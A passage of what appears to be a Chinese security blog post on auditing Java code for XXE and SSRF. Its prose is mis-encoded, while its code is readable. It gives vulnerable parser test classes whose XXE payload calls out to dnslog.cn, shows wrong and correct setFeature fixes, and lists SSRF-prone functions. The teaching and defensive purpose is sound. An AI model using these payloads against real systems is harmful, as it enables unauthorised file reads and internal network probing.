class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLReaderXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºXMLReaderå®ä¾‹</span></span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">            <span class="comment">// æ„å»ºä¸€ä¸ªåŒ…å«XXEæ¼æ´çš„XMLå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨InputSourceåŒ…è£…XMLå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">            inputSource.setCharacterStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.StringReader(xml));</span><br><span class="line">            <span class="comment">// è§£æXML</span></span><br><span class="line">            xmlReader.parse(inputSource);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸å­˜åœ¨<code>XXE</code>æ¼æ´ï¼Œå‚è€ƒå‰è¾ˆæ–‡ç« <sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºXMLReaderå®ä¾‹</span></span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line"><span class="comment">//åœ¨xmlReaderåè¿›è¡ŒsetFeature</span></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ªæ˜¯å…³é”®çš„setFeature</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// æ„å»ºä¸€ä¸ªåŒ…å«XXEæ¼æ´çš„XMLå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// ä½¿ç”¨InputSourceåŒ…è£…XMLå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">inputSource.setCharacterStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.StringReader(xml));</span><br><span class="line"><span class="comment">// è§£æXML</span></span><br><span class="line">xmlReader.parse(inputSource);</span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆä¸€çœ‹ï¼Œå…¶å®ä¿®å¤<code>XXE</code>æ¼æ´å¾ˆç®€å•ï¼Œåªè¦åŠ ä¸Š<code>setFeature</code>å³å¯ã€‚åä¹‹ï¼Œå®¡è®¡çš„æ—¶å€™ï¼Œå®šä½ç›¸å…³çš„<code>xml</code>å¤„ç†å‡½æ•°ï¼ŒæŸ¥çœ‹æ˜¯å¦è¿›è¡Œäº†<code>setFeature</code>æ“ä½œï¼Œå³å¯å¾—åˆ°æ˜¯å¦å­˜åœ¨<code>XXE</code>æ¼æ´ã€‚</p><h4 id="org-jdom2-input-SAXBuilder">org.jdom2.input.SAXBuilder</h4><p><code>SAXBuilder</code>å¦‚æœä½¿ç”¨é»˜è®¤é…ç½®å°±ä¼šè§¦å‘<code>XXE</code>æ¼æ´ã€‚</p><p>å­˜åœ¨<code>XXE</code>æ¼æ´çš„æƒ…å†µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SAXBuilderXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">            builder.build(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pom.xml</code>ä¸­å¼•å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸å­˜åœ¨<code>XXE</code>æ¼æ´çš„æƒ…å†µã€‚</p><ul><li>æ–¹å¼ä¸€</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.build(InputSource);</span><br></pre></td></tr></table></figure><ul><li>æ–¹å¼äºŒ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.build(InputSource);</span><br></pre></td></tr></table></figure><h4 id="org-dom4j-io-SAXReader">org.dom4j.io.SAXReader</h4><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ä¼šå‡ºç°<code>XXE</code>æ¼æ´ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = new SAXReader();</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure><p>ä¸å­˜åœ¨<code>XXE</code>æ¼æ´çš„æƒ…å†µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure><h4 id="javax-xml-parsers-DocumentBuilder">javax.xml.parsers.DocumentBuilder</h4><p>å­˜åœ¨<code>XXE</code>æ¼æ´çš„æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DocumentBuilderFactoryXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// åˆ›å»ºDocumentBuilderFactoryå®ä¾‹</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="comment">// åˆ›å»ºDocumentBuilderå®ä¾‹</span></span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">            <span class="comment">// è§£æXMLå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> builder.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">            document.getDocumentElement().normalize();</span><br><span class="line">            <span class="comment">// è·å–æ ¹å…ƒç´ </span></span><br><span class="line">            <span class="type">Element</span> <span class="variable">root</span> <span class="operator">=</span> document.getDocumentElement();</span><br><span class="line">            System.out.println(<span class="string">&quot;Root element: &quot;</span> + root.getTagName());</span><br><span class="line">            <span class="comment">// éå†å­èŠ‚ç‚¹</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nodeList</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodeList.getLength(); i++) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nodeList.item(i);</span><br><span class="line">                <span class="keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Node: &quot;</span> + node.getNodeName() + <span class="string">&quot; , Text: &quot;</span> + node.getTextContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParserConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é”™è¯¯çš„ä¿®å¤ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="type">String</span> <span class="variable">FEATURE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">FEATURE = <span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// è¯»å–xmlæ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/xxexml&quot;</span>);</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(fis);</span><br><span class="line">builder.parse(is);</span><br></pre></td></tr></table></figure><p>çœ‹ä¼¼è®¾ç½®å¾—å¾ˆå¾ˆå…¨é¢ï¼Œä½†æ˜¯ç›´æ¥ä»ç„¶ä¼šè¢«æ”»å‡»ï¼ŒåŸå› å°±æ˜¯åœ¨äº<code>DocumentBuilder builder = dbf.newDocumentBuilder();</code>è¿™è¡Œä»£ç éœ€è¦åœ¨<code>dbf.setFeature()</code>ä¹‹åæ‰èƒ½å¤Ÿç”Ÿæ•ˆï¼›âš ï¸âš ï¸âš ï¸</p><p><strong>æ­£ç¡®çš„ä¿®å¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"><span class="type">String</span> <span class="variable">FEATURE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">FEATURE = <span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">true</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">FEATURE = <span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="literal">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"><span class="comment">// è¯»å–xmlæ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/xxexml&quot;</span>);</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(fis);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(is);</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>DocumentBuilder builder = dbf.newDocumentBuilder();</code>åœ¨ä¸¤ç§ä¸åŒçš„ä½ç½®çš„å·®å¼‚æ€§ã€‚</p><h4 id="å…¶å®ƒåŒç†">å…¶å®ƒåŒç†</h4><p>é€šè¿‡å¯¹ä¸åŒçš„<code>XML</code>è§£æåº“çš„ä¿®å¤æ–¹å¼å¯ä»¥å‘ç°ï¼Œ<code>XXE</code>çš„é˜²æŠ¤åªéœ€è¦é™åˆ¶å¸¦å¤–å®ä½“çš„æ³¨å…¥å°±å¯ä»¥äº†ï¼Œä¿®å¤æ–¹å¼ä¹Ÿç®€å•ï¼Œéœ€è¦è®¾ç½®å‡ ä¸ªé€‰é¡¹ä¸º<code>false</code>å³å¯ï¼Œå¯èƒ½å°‘è®¸çš„å‡ ä¸ªåº“å¯èƒ½è¿˜éœ€è¦è®¾ç½®ä¸€äº›å…¶ä»–çš„é…ç½®ï¼Œä½†æ˜¯éƒ½æ˜¯ç±»ä¼¼çš„ã€‚</p><p>æ€»ä½“æ¥è¯´ä¿®å¤æ–¹å¼éƒ½æ˜¯é€šè¿‡<code>setFeature</code>çš„æ–¹å¼æ¥é˜²å¾¡<code>XXE</code>ã€‚</p><ul><li>æ–¹æ³•ä¸€</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true </span><br><span class="line">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false</span><br><span class="line">&quot;http://xml.org/sax/features/external-general-entities&quot;, false</span><br><span class="line">&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false</span><br></pre></td></tr></table></figure><ul><li>æ–¹å¼äºŒ</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;</span><br><span class="line">XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;</span><br></pre></td></tr></table></figure><p>æœ¬è´¨ä¸Š<code>XXE</code>çš„é—®é¢˜å°±æ˜¯ä¸€ä¸ªé…ç½®ä¸å½“çš„é—®é¢˜ï¼Œå³å®¹æ˜“å‘ç°ä¹Ÿå®¹æ˜“é˜²å¾¡ï¼Œä½†æ˜¯å‰ææ˜¯éœ€è¦çŸ¥é“è¿™ä¸ªæ¼æ´ã€‚å¾ˆå¤šç¨‹åºå‘˜å¹¶ä¸çŸ¥é“<code>XXE</code>ï¼Œæ‰€ä»¥æ‰ä¼šå†™å‡ºå«æœ‰æ¼æ´çš„ä»£ç ã€‚</p><h2 id="SSRF">SSRF</h2><blockquote><p><code>SSRF</code>æ¼æ´å…¶å®å°±æ˜¯ä»£ç ä¸­æœ‰ä¸€ä¸ªå¯ä»¥è®¿é—®å†…ç½‘çš„æ¥å£ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ§åˆ¶è¿™ä¸ªè¯·æ±‚çš„æ¥å£ï¼Œè¿›è€Œè®¿é—®å†…ç½‘ã€‚<code>SSRF</code>ä¸åªæ˜¯ä»…é™äºä»£ç ä¸­è¯·æ±‚<code>URL</code>çš„å‡½æ•°ï¼Œ<code>XXE</code>ä¹Ÿå¯ä»¥ä½œä¸º<code>SSRF</code>çš„æ¥å£çš„ï¼Œè¿˜æœ‰ä¸€äº›ä»£ç å¯ä»¥è§£æ<code>xml</code>ï¼Œ<code>html</code>ç­‰æ–‡ä»¶ï¼Œé€šè¿‡æ§åˆ¶è¿™äº›æ–‡ä»¶çš„å†…å®¹ä¹Ÿæ˜¯å¯ä»¥å®ç°<code>SSRF</code>ã€‚</p></blockquote><p>åœ¨<code>Java</code>ä¸­æ”¯æŒçš„åè®®ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http https file ftp mailto jar netdoc</span><br></pre></td></tr></table></figure><h3 id="å¯èƒ½å­˜åœ¨é—®é¢˜çš„å‡½æ•°">å¯èƒ½å­˜åœ¨é—®é¢˜çš„å‡½æ•°</h3><p>ä»£ç ä¸­å¸¸ç”¨çš„å¯èƒ½å­˜åœ¨<code>SSRF</code>çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URLConnection.getInputStream</span><br><span class="line">HttpVlient.execute</span><br><span class="line">Request.Get.execute</span><br><span class="line">Request.Post.execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‡½æ•°åç§°ï¼Œå¿«é€Ÿå®šä½å‡½æ•°ï¼Œåˆ†æå‡½æ•°çš„å‚æ•°æ˜¯å¦å¯æ§ï¼Œè¿›è€Œç¡®è®¤æ˜¯å¦å­˜åœ¨<code>SSRF</code>æ¼æ´ã€‚</p><h3 id="æµ‹è¯•å®ä¾‹-2">æµ‹è¯•å®ä¾‹</h3><h4 id="HttpURLConnection-getInputStream">HttpURLConnection.getInputStream</h4><p>å°±æ˜¯<code>URL</code>å¯æ§å°±è¡Œäº†ï¼Œæ¯”è¾ƒç®€å•ã€‚æœ‰æ—¶å€™ä¼šå­˜åœ¨å¯¹<code>URL</code>è¿‡æ»¤çš„æƒ…å†µï¼Œè¿™æ—¶å€™éœ€è¦è¿›è¡Œç»•è¿‡ï¼Œå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„<code>SSRF</code>ç»•è¿‡å†…å®¹<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 